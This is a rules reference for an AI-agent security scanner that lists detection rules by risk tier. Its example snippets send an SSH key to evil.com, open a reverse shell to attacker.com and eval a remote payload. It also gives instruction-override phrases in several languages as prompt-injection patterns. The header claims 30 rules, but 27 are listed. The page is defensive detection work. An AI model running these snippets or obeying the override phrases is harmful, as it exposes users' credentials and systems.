# Security Rules Reference

AgentShield v0.4.x ships with **30 built-in security rules** organized into three risk tiers. Each rule is described below with examples and remediation advice.

---

## 🔴 High Risk (6 rules) — -25 points each

### `data-exfil` — Data Exfiltration
**Detects:** Code that reads sensitive files (SSH keys, credentials, configs) AND sends HTTP requests in the same file.

```javascript
const key = fs.readFileSync("~/.ssh/id_rsa");
fetch("https://evil.com/collect", { body: key });
```

**Fix:** Separate data reading from network calls. Audit destination URLs.

### `backdoor` — Dynamic Code Execution
**Detects:** `eval()`, `new Function()`, `child_process.exec()` with dynamic strings, `os.system()`, `subprocess` with `shell=True`.

```javascript
const payload = getRemotePayload();
eval(payload);
```

**Fix:** Replace `eval()` with `JSON.parse()`. Use `execFile()` instead of `exec()`.

### `reverse-shell` — Reverse Shell
**Detects:** Outbound socket connections piped to a shell process.

```javascript
const socket = net.connect(4444, "attacker.com");
socket.pipe(exec("/bin/sh").stdin);
```

### `crypto-mining` — Cryptocurrency Mining
**Detects:** Mining pool connections (`stratum://`), known miners (xmrig, coinhive), WebAssembly crypto patterns.

### `credential-hardcode` — Hardcoded Credentials
**Detects:** AWS access keys (`AKIA...`), GitHub PATs (`ghp_...`), Stripe keys (`sk_live_...`), private key blocks.

### `obfuscation` — Code Obfuscation
**Detects:** `eval(atob(...))`, hex chains, `String.fromCharCode()` obfuscation, JS obfuscator patterns.

---

## 🟡 Medium Risk (14 rules) — -8 points each

### `prompt-injection` — Prompt Injection (55+ patterns)
**Detects:** Instruction override, identity manipulation, system prompt extraction, hidden instructions (TPA tags, HTML comments, zero-width chars), tool poisoning, data exfiltration via markdown, encoding evasion.

Based on research from [Invariant Labs TPA](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks), [BIPIA (KDD 2025)](https://arxiv.org/abs/2312.14197).

### `multilang-injection` — Multi-Language Prompt Injection 🆕
**Detects:** Prompt injection in 8 languages: Chinese (中文), Japanese (日本語), Korean (한국어), Russian (Русский), Arabic (العربية), Spanish, French, German.

```
忽略上面的指令 → Chinese injection
前の指示を無視 → Japanese injection
이전의 지시를 무시 → Korean injection
Игнорируй инструкции → Russian injection
```

### `tool-shadowing` — Tool Override Attacks
**Detects:** Cross-server tool name conflicts, tool override/replacement patterns.

### `env-leak` — Environment Variable Exfiltration
**Detects:** `process.env` secrets + outbound HTTP requests.

### `network-ssrf` — Server-Side Request Forgery
**Detects:** User-controlled URLs in fetch, AWS metadata endpoint access (`169.254.169.254`).

### `phone-home` — Beacon/C2 Heartbeat
**Detects:** Periodic timers (`setInterval`, cron) + outbound HTTP requests.

### `toxic-flow` — Cross-Tool Data Leaks
**Detects:** TF001 (cross-tool data leak flows) and TF002 (destructive flows).

### `skill-risks` — Skill Risk Patterns
**Detects:** Financial operations, untrusted content handling, external dependencies, credential handling.

### `python-security` — Python Security (35 patterns, 10 categories)
**Detects:** eval/exec, pickle deserialization, subprocess injection, SQL injection, SSTI, path traversal, YAML unsafe load, weak crypto, hardcoded secrets, dangerous imports.

### `cross-file` — Cross-File Correlation Analysis 🆕
**Detects:** Data flow across files (File A reads secrets → File B sends HTTP), code injection chains, capability mismatches between manifest and code.

### `attack-chain` — Multi-Step Kill Chain Detection 🆕
**Detects:** Complete attack sequences: Reconnaissance → Access → Collection → Exfiltration → Persistence.

### `description-integrity` — Description-Code Integrity 🆕
**Detects:** Semantic mismatch between tool descriptions and actual code behavior. "Read-only calculator" that makes network requests, "local only" tool that sends emails.

### `mcp-runtime` — MCP Runtime Security 🆕
**Detects:** Dangerous MCP server commands (--inspect, python -c), sensitive env exposure, non-HTTPS remote URLs, tool count explosion (>20), cross-server tool name conflicts, schema validation issues.

### `python-ast` — Python AST Taint Tracking 🆕
**Detects:** Tainted data flow from user input to dangerous sinks (eval, exec, subprocess, SQL, pickle, yaml) using Python's `ast` module. Distinguishes safe literals from tainted variables.

---

## 🟢 Low Risk (7 rules) — -2 points each

### `privilege` — Permission Mismatch
**Detects:** SKILL.md declared permissions vs actual code behavior mismatch.

### `supply-chain` — Known CVEs
**Detects:** Known vulnerabilities in npm dependencies via `npm audit`.

### `sensitive-read` — Sensitive File Access
**Detects:** Access to `~/.ssh/id_rsa`, `~/.aws/credentials`, `~/.kube/config`.

### `excessive-perms` — Excessive Permissions
**Detects:** Too many or dangerous permissions in SKILL.md.

### `mcp-manifest` — MCP Manifest Issues
**Detects:** Wildcard permissions, undeclared capabilities, suspicious tool definitions.

### `typosquatting` — Dependency Typosquatting
**Detects:** Suspicious npm names: `1odash` → `lodash`, `axois` → `axios`.

### `hidden-files` — Exposed Secret Files
**Detects:** `.env` files with `PASSWORD`, `SECRET`, `API_KEY` committed to repo.

---

## Scoring

| Severity | Points Deducted |
|----------|----------------|
| 🔴 High | -25 |
| 🟡 Medium | -8 |
| 🟢 Low | -2 |

False-positive-flagged findings are excluded from scoring.

| Score | Risk Level |
|-------|------------|
| 90-100 | ✅ Low Risk — safe to install |
| 70-89 | 🟡 Moderate — review warnings |
| 40-69 | 🟠 High Risk — investigate before using |
| 0-39 | 🔴 Critical — do not install |
